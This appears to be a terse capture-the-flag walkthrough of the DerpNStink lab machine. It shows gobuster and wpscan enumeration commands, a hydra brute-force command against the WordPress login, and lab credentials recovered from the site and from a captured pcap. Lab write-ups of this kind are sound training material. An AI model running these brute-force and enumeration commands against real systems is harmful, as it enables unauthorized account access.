```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://192.168.1.49 -o initial_dir
```

![unnamed_1e527ff28eaf43eb89cc1b43ed372c45](unnamed_1e527ff28eaf43eb89cc1b43ed372c45.png)

weblog is a wordpress site. It redirects us to <http://derpnstink.local> so we need to add it to /etc/hosts. Virtual host routing. 

```
wpscan --url <http://derpnstink.local/weblog/> -e vt,tt,u,ap 
```

![unnamed_05d9aae6fd874f2bab1ffcc74d4cdfa4](unnamed_05d9aae6fd874f2bab1ffcc74d4cdfa4.png)

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.49 http-post-form '/weblog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:S=Location' -V -e nsr -f -t 50
```

![unnamed_2a163ef24e714626a81fe1e0299e1e04](unnamed_2a163ef24e714626a81fe1e0299e1e04.png)
![unnamed_7a7bebd9f8c74083a00d0b717a53ee70](unnamed_7a7bebd9f8c74083a00d0b717a53ee70.png)
![unnamed_cede256b4b9740438acb3ebf89559721](unnamed_cede256b4b9740438acb3ebf89559721.png)
![unnamed_6359a1d572f54ee39072a09b9aa058ff](unnamed_6359a1d572f54ee39072a09b9aa058ff.png)
![unnamed_ac316cbcca77409f92866401135c75a8](unnamed_ac316cbcca77409f92866401135c75a8.png)

```
unclestinky:wedgie57
admin:admin
```

![unnamed_8fb830a4b9e348e9b937122881d3dcad](unnamed_8fb830a4b9e348e9b937122881d3dcad.png)

FOUND PCAP FILE

![unnamed_605d65767879456d82c272a99d7a0142](unnamed_605d65767879456d82c272a99d7a0142.png)

tranferred it to kali for wireshark

![unnamed_488461fcc7d2439e947e47ef8186a0c4](unnamed_488461fcc7d2439e947e47ef8186a0c4.png)

went through all http requests i could find. Found these credentials:

```
mrderp
derpderpderpderpderpderpderp
```

You can find clear text credentials over ###  FTP, SMTP, HTTP, POP3, IMAP4, SNMP, LDAP etc.. 

<https://www.infosecmatter.com/capture-passwords-using-wireshark/>

![unnamed_ddcb41e7e1694e20b4e6c72e686d7b1e](unnamed_ddcb41e7e1694e20b4e6c72e686d7b1e.png)

This will be ezpz 

![unnamed_6a593b09adf04a698ded6b84ebd61fc9](unnamed_6a593b09adf04a698ded6b84ebd61fc9.png)
![unnamed_a989995f408d4a2bb7eb1e25532f3c0b](unnamed_a989995f408d4a2bb7eb1e25532f3c0b.png)
![unnamed_e9ee3f418d4340b9972cd09025bd38fa](unnamed_e9ee3f418d4340b9972cd09025bd38fa.png)
![unnamed_f1793836af9f4b4e94598065496cbcee](unnamed_f1793836af9f4b4e94598065496cbcee.png)